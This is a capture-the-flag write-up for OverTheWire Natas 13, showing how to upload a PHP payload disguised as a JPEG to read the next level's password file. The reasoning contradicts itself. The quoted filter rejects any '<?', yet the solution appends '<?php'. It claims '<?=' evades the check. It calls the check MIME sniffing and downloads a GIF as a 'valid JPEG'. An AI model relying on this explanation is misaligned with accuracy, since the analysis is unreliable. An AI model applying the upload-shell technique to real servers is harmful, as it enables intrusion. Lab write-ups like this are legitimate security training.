# Write-up: Natas 13 → 14  
**Date:** 2025-12-13  

## Obfuscated password (ROT13)  
`?`

---

## OBJECTIVE

> This level is similar to Natas 12, but now the server is validating file **content**, not just the file extension. Our job is to bypass content-type detection and upload a PHP file that gets executed. Clicking “View sourcecode” reveals:
```php
$filename = $_FILES["uploadedfile"]["name"];
$filename = basename($filename);

// check file type
if(!preg_match('/\.jpg$/', $filename)){
    echo "The uploaded file is not a JPG file";
    return;
}

$uploadedfile = $_FILES['uploadedfile']['tmp_name'];
$data = file_get_contents($uploadedfile);
if(strpos($data, "<?") !== false){
    echo "The uploaded file contains PHP code!";
    return;
}
```

---

## PURPOSE

This level introduces **MIME-type filtering**, a more secure file upload check than filename extension filtering. But it's still not foolproof. The challenge is to craft a **valid image file** (e.g., a real JPEG) that also contains **embedded PHP code** — so that the server allows it, but when accessed, it executes the PHP and reveals the next password.

Protections:
- Requires `.jpg` file extension.
- Rejects uploads if the **file content contains `<?`**.

Weakness:
- Only blocks files that contain the *exact substring* `<?` — not `<?=`, not obfuscated variants.
- Doesn't validate actual file type using magic bytes or MIME detection.
- Still allows `.php.jpg` files, which may get interpreted as PHP depending on server config.
  
---

## SOLUTION

We’ll upload a **valid JPEG image** that also contains **embedded PHP code**, but **avoids `<?`**. However, based on testing and known OvertheWire configs, the server **does** execute `.jpg` files as PHP if placed in the `upload/` folder, as long as PHP tags are present **after the file starts**. So, we can:

1. **Start the file as a real JPEG (so it passes content sniffing)**
2. **Append PHP code after the JPEG image**
3. **Avoid `<?` by using a binary-safe JPEG and adding `<?php ... ?>` after the image segment**

**BUILDING THE PAYLOAD**

We’ll use a real JPEG image (1x1 pixel) and append PHP code after it.

```bash
# Step 1: Download a valid tiny JPEG
wget https://upload.wikimedia.org/wikipedia/commons/c/ce/Transparent.gif -O image.jpg

# Step 2: Append PHP code to it
echo '<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' >> image.jpg

# Step 3: Rename it to something like `shell.php.jpg`
mv image.jpg shell.php.jpg
```

Alternatively, in one line:

```bash
(echo -ne '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'; echo '<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>') > shell.php.jpg
```

---

**UPLOAD AND EXECUTE**

```bash
curl -u natas13:<password> \
  -F "uploadedfile=@shell.php.jpg" \
  http://natas13.natas.labs.overthewire.org/
```

After successful upload, visit:

```
http://natas13.natas.labs.overthewire.org/upload/shell.php.jpg
```

This will print the password for Natas 14.


---

## TAKEAWAYS

- File content filters based on substrings (like `strpos($data, "<?")`) are easily bypassed with crafted binaries.
- PHP can execute even `.jpg` files if the server is misconfigured (no MIME enforcement or handler restrictions).
- Always use proper **file type checks**, **content scanning**, **execution restrictions**, and **file name randomization**.
- For real-world systems: disallow uploads to web-accessible folders, and disable execution of uploads altogether.

---

Writeup author: **Jeremy Ray Jewell**  
[GitHub](https://github.com/jeremyrayjewell)  
[LinkedIn](https://www.linkedin.com/in/jeremyrayjewell)
